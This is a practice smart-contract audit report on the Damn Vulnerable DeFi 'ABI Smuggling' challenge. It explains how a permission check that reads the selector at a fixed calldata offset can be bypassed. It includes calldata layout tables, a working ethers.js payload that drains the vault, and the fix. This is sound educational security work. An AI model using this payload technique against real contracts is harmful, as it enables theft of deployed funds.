@@ -1,0 +1,177 @@
+Smart Contract Security Review: ABI Smuggling
+
+**Target:** Damn Vulnerable DeFi v4, ABI Smuggling challenge (`AuthorizedExecutor`, `SelfAuthorizedVault`) **Reviewer:** Mandela Koyier **Review type:** Manual review with working proof of concept **Date:** February 2024 **Overall risk:** Critical
+
+> Practice review of an intentionally vulnerable educational codebase. All exploits were run on a local test network only. This is not a paid client engagement.
+
+## 1. Executive Summary
+
+The vault holds 1,000,000 DVT and lets callers run only the functions they have been granted permission for, through a single `execute()` entry point. The permission check reads the function selector from a fixed position in the raw calldata, but the call that actually runs is built from the ABI-decoded `actionData` argument. Those two locations can be made to differ.
+
+An attacker with permission for one harmless function can place that function's selector where the check looks, and place a different, unauthorized call where the vault executes. The result is a full drain of the vault in one transaction, with no special privileges.
+
+The fix is one line: read the selector from `actionData` itself, so the checked selector and the executed selector come from the same source.
+
+## 2. Scope
+
+| Contract | Purpose | Approx. LOC |
+| --- | --- | --- |
+| `AuthorizedExecutor.sol` | Abstract permission layer for `execute()` | \~90 |
+| `SelfAuthorizedVault.sol` | Vault that holds DVT and sets its own permissions | \~70 |
+
+**Out of scope:** `DamnValuableToken.sol` (standard ERC-20), frontend, deployment scripts.
+
+**Tools:** Remix IDE for manual review, Hardhat for the proof of concept, manual hex-level calldata analysis.
+
+## 3. Findings Summary
+
+| ID | Title | Severity | Status |
+| --- | --- | --- | --- |
+| VULN-001 | ABI smuggling bypasses the `execute()` permission check | Critical | Confirmed with PoC |
+| INFO-001 | No length check before reading the selector | Informational | Open |
+| INFO-002 | No events on permission changes | Informational | Open |
+
+## 4. Finding VULN-001: ABI Smuggling Bypasses the Permission Check
+
+**Severity:** Critical **Contract / function:** `AuthorizedExecutor.execute(address target, bytes calldata actionData)`
+
+### Description
+
+`execute()` is meant to confirm that the caller may invoke the function encoded in `actionData`. To get the selector, it reads 32 bytes from a hardcoded calldata offset (`4 + 32 * 3 = 100 = 0x64`) instead of decoding the `actionData` parameter.
+
+For dynamic types such as `bytes`, ABI encoding stores an offset pointer, and the data it points to can sit anywhere after the head. A caller can therefore craft calldata where:
+
+- the permitted selector (`deposit()`) sits at `0x64`, where the check reads, and
+- the `actionData` pointer is shifted so it resolves to a different payload (`sweepFunds()`) further along.
+
+The check passes, but the vault runs the unauthorized call.
+
+### Vulnerable code
+
+```solidity
+function execute(address target, bytes calldata actionData) external nonReentrant auth {
+    // VULNERABLE: selector read from a fixed raw calldata position
+    bytes4 selector;
+    uint256 calldataOffset = 4 + 32 * 3; // = 100 = 0x64
+    assembly {
+        selector := calldataload(calldataOffset)
+    }
+
+    if (!permissions[getActionId(selector, msg.sender, target)])
+        revert NotAllowed();
+
+    _beforeFunctionCall(target, actionData);
+
+    // actionData is resolved through the ABI offset pointer, not from 0x64
+    (bool success, ) = target.call(actionData);
+    if (!success) revert ExecutionFailed();
+}
+```
+
+### Calldata layout
+
+Honest call, `execute(vault, depositCalldata)`:
+
+| Offset | Content |
+| --- | --- |
+| `0x00` | `execute()` selector (4 bytes) |
+| `0x04` | target address, padded to 32 bytes |
+| `0x24` | offset pointer to `actionData` = `0x40` |
+| `0x44` | length of `actionData` |
+| `0x64` | `actionData` content, so the `deposit()` selector sits here (the check reads this) |
+
+Smuggled call:
+
+| Offset | Content |
+| --- | --- |
+| `0x00` | `execute()` selector |
+| `0x04` | target address, padded |
+| `0x24` | offset pointer = `0x80` (shifted; offsets are measured from byte 4, so it resolves to `0x84`) |
+| `0x44` | 32 bytes of zero filler |
+| `0x64` | `deposit()` selector, right-padded to 32 bytes (the check reads this and passes) |
+| `0x84` | length of the real `actionData` = 68 (`0x44`) |
+| `0xa4` | `sweepFunds(recovery, token)` (what `.call()` executes) |
+
+### Proof of concept
+
+The attacker is the permitted player and sends the crafted calldata directly to the vault. Permissions are tied to `msg.sender`, so the call must come from the account that holds the `deposit()` permission.
+
+```javascript
+const executeSelector = vault.interface.getFunction("execute").selector;
+const depositSelector = vault.interface.getFunction("deposit").selector;
+const sweepData = vault.interface.encodeFunctionData("sweepFunds", [
+  recoveryAddress,
+  tokenAddress,
+]);
+
+const payload = ethers.concat([
+  executeSelector,
+  ethers.zeroPadValue(vaultAddress, 32),                                 // 0x04 target
+  ethers.zeroPadValue(ethers.toBeHex(0x80), 32),                        // 0x24 shifted offset
+  ethers.ZeroHash,                                                       // 0x44 filler
+  ethers.zeroPadBytes(depositSelector, 32),                              // 0x64 permitted selector
+  ethers.zeroPadValue(ethers.toBeHex(ethers.dataLength(sweepData)), 32), // 0x84 length = 68
+  sweepData,                                                             // 0xa4 smuggled call
+]);
+
+await player.sendTransaction({ to: vaultAddress, data: payload });
+```
+
+The Hardhat test asserts that after this single transaction the vault balance is `0` and the recovery address holds the full 1,000,000 DVT.
+
+### Impact
+
+An attacker who holds permission for any single function, even a benign one, can call any other function on the vault. Here that means `sweepFunds()`, which moves 100% of the vault's tokens to an address the attacker chooses. The attack takes one transaction and needs no capital.
+
+**Financial impact:** all funds in the vault at risk.
+
+### Recommendation
+
+Read the selector from the same data that will be executed:
+
+```solidity
+// Before (vulnerable)
+bytes4 selector;
+uint256 calldataOffset = 4 + 32 * 3;
+assembly {
+    selector := calldataload(calldataOffset)
+}
+
+// After (fixed)
+require(actionData.length >= 4, "Invalid action data");
+bytes4 selector = bytes4(actionData[:4]);
+```
+
+The checked selector and the executed selector now always match, so the two can no longer be separated.
+
+## 5. Informational Notes
+
+**INFO-001: Validate selector length.** Check `actionData.length >= 4` before slicing, so empty calldata fails with a clear error. This is included in the fix above.
+
+**INFO-002: Emit events on permission changes.** The contract does not emit events when permissions are granted or revoked, which makes off-chain monitoring difficult.
+
+## 6. Conclusion
+
+This is a subtle class of bug that appears whenever a contract parses calldata by hand instead of using Solidity's ABI decoder. Any manual calldata handling in a permission-critical path should be treated with suspicion, and the check and the action should always read from one source. With the one-line fix applied, this specific bypass is closed, assuming no other attack surface is added.
+
+## Appendix
+
+### Severity definitions
+
+| Level | Meaning |
+| --- | --- |
+| Critical | Direct loss of funds, immediately exploitable |
+| High | Indirect loss of funds, realistic but complex attack |
+| Medium | Denial of key functions or edge-case fund risk |
+| Low | Best-practice violations, minor risk |
+| Informational | Code quality, no security impact |
+
+### References
+
+- ABI encoding specification: https://docs.soliditylang.org/en/latest/abi-spec.html
+- Damn Vulnerable DeFi, ABI Smuggling: https://www.damnvulnerabledefi.xyz/challenges/abi-smuggling/
+- OpenZeppelin, Backdooring Gnosis Safe multisig wallets: https://blog.openzeppelin.com/backdooring-gnosis-safe-multisig-wallets
+
+### Disclaimer
+
+This review covers a challenge contract written for education. It is not financial or legal advice. All exploits were run on local test environments only.
